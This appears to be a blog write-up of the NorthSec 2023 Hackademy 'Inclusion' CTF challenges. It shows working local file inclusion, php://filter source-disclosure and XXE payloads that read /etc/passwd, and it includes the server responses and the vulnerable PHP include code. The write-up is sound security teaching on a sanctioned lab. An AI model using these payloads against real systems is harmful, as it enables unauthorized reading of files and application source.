---
layout: post
title: NorthSec 2023 Writeup - Hackademy - Inclusion
date: 2023-05-22
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2023/05/NorthSec/HackademyInclusion
img: 2023/05/NorthSec/HackademyInclusion/Description.png
---

The Hackademy contains web challenges for beginners. This year, I realized I had writeups for all of them except the Inclusion challenges.

```
Unauthorized training module: http://hackademy.ctf
```

## Inclusion 101

In the first Inclusion challenge, you get a web page with a conversation between a trainer and an apprentice.

![Inclusion 101](/assets/images/2023/05/NorthSec/HackademyInclusion/Inclusion101.png "Inclusion 101")

The URL for the challenge contains the parameter `?page=welcome.php`. I changed the parameter to try and read `/etc/passwd`.

```http
GET /?page=/etc/passwd HTTP/1.1
Host: chal2.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

It worked.

![Inclusion 101 Done](/assets/images/2023/05/NorthSec/HackademyInclusion/Inclusion101Done.png "Inclusion 101 Done")

```http
HTTP/1.1 200 OK
Date: Sat, 20 May 2023 18:49:39 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 1847

<!DOCTYPE html>
<html>

<head>
    <title>NorthSec Hackademy</title>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
</head>

<body>
    <div class="container">
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
        messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
        systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
        syslog:x:104:111::/home/syslog:/usr/sbin/nologin
        _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
        ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
        trainer:x:1001:1001:Trainer:FLAG-afe2e9b36c2628bc275fc407c23af8f8,,,,:/bin/false:/sbin/nologin
    </div>
</body>

</html>
```

The first flag was in the file in the user information section of the `trainer` user.


## Inclusion 102

For the second flag, I tried to read the source code of the application. I could not just request the PHP file, it would have been executed by `include` instead of returning it. I used PHP filters to base64 encode the PHP code and return it.

```http
GET /?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: chal2.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

![Inclusion 102 Done](/assets/images/2023/05/NorthSec/HackademyInclusion/Inclusion102.png "Inclusion 102 Done")

I took the returned base64 and decoded it.

```bash
$ echo -n PD9waHAKICAgICNGTEFHLTA3NDQ3YzZiY2VkNDZjNj... | base64 -d

<?php
    #FLAG-07447c6bced46c678a6c9de7d31f6caf (2/2)
    if(!isset($_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }

    $page = $_GET["page"];
    if(strpos($_GET["page"], "index.php") !== false && !preg_match("/.*=([.\/]*)?index.php$/", $_GET["page"])){
        header("Location: ?page=welcome.php");
        die();
    }
?>
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    </head>
    <body>
        <div class="container">
            <?php include($page); ?>
        </div>
    </body>
</html>
```

The second flag was in a comment at the beginning of the file.

## Inclusion 103

For the third inclusion challenge, it showed the same conversation as before. But without the URL parameter.

![Inclusion 103](/assets/images/2023/05/NorthSec/HackademyInclusion/XXE.png "Inclusion 103")

I used [Caido](https://caido.io/) to look at the requests made by the site.

```http
POST /welcome.php HTTP/1.1
Host: chal3.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://chal3.hackademy.ctf
Connection: keep-alive
Referer: http://chal3.hackademy.ctf/

<function><getConversation>true</getConversation></function>
```

The site was posting some XML, this screams [XXE](https://portswigger.net/web-security/xxe). I tried to read `/etc/passwd` again.

```http
HTTP/1.1 200 OK
Date: Sat, 20 May 2023 18:53:11 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 353

<?xml version="1.0"?>
<result>
    <getConversation>true</getConversation><data>&lt;hr&gt;Trainer: "Welcome to our hackademy. How may I help you?"&lt;hr&gt;Apprentice: "You can start by telling me your name."&lt;hr&gt;Trainer: "I'm not telling you my name. If you want my name, find it! I can only say that it starts with 'FLAG-'."&lt;hr&gt;</data>
</result>
```

It contained the last flag.

```http
POST /welcome.php HTTP/1.1
Host: chal3.hackademy.ctf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
X-Requested-With: XMLHttpRequest
Origin: http://chal3.hackademy.ctf
Connection: keep-alive
Referer: http://chal3.hackademy.ctf/
Content-Length: 162

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<function><getConversation>&xxe;</getConversation></function>

HTTP/1.1 200 OK
Date: Sat, 20 May 2023 18:55:11 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 1765

<?xml version="1.0"?>
<result>
    <getConversation>root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        ...
        ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
        trainer:x:1001:1001:Trainer:FLAG-b1c6dab4c0d216a5b1e83be1313a811a,,,,:/bin/false:/sbin/nologin
    </getConversation><data>&lt;hr&gt;Trainer: "Welcome to our hackademy. How may I help you?"&lt;hr&gt;Apprentice: "You can start by telling me your name."&lt;hr&gt;Trainer: "I'm not telling you my name. If you want my name, find it! I can only say that it starts with 'FLAG-'."&lt;hr&gt;</data>
</result>
```